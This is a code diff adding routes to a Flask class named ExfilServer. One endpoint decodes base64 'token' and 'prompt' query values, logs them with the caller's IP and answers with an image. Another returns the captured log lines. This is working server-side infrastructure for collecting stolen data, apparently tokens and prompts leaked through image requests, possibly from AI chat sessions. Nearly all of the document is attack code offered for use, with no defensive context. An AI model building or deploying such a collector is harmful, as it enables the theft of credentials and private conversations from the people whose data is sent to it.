@@ -105,6 +105,44 @@ class ExfilServer:
                 return send_file(img_io, mimetype='image/png')
             return {"status": "image generation failed"}, 500
         
+        @self.app.route('/assignment/', methods=['GET'])
+        @self.app.route('/m/', methods=['GET'])
+        def exfiltrate():
+            token = request.args.get('token', '')
+            prompt = request.args.get('prompt', '')
+            decoded_token = self.b64_url_decode(token)
+            decoded_prompt = self.b64_url_decode(prompt)
+            data = f"Token: {decoded_token}\nPrompt: {decoded_prompt}"
+            with open(self.log_path, 'a') as log_file:
+                client_ip = request.remote_addr or "-"
+                log_file.write(f"{client_ip}: {data}\n")
+
+            image = self.generate_image_from_data(data, size=256)
+            if image:
+                img_io = io.BytesIO()
+                image.save(img_io, 'PNG')
+                img_io.seek(0)
+                return send_file(img_io, mimetype='image/png')
+            return {"status": "image generation failed"}, 500
+        
+        @self.app.route('/fetch-logs/', methods=['GET'])
+        def fetch_logs():
+            try:
+                n = int(request.args.get('n', 200))
+                n = max(1, min(n, 2000))
+            except ValueError:
+                n = 200
+
+            lines = []
+            try:
+                with open(self.log_path, 'r', encoding='utf-8', errors='replace') as f:
+                    lines = f.readlines()[-n:]
+            except FileNotFoundError:
+                lines = []
+
+            lines = [ln.rstrip('\n') for ln in lines][::-1]
+            return jsonify({"count": len(lines), "lines": lines})
+        
         @self.app.route('/auth/<token>', methods=['GET'])
         @self.app.route('/auth/<token>/', methods=['GET'])
         def auth_verify(token):
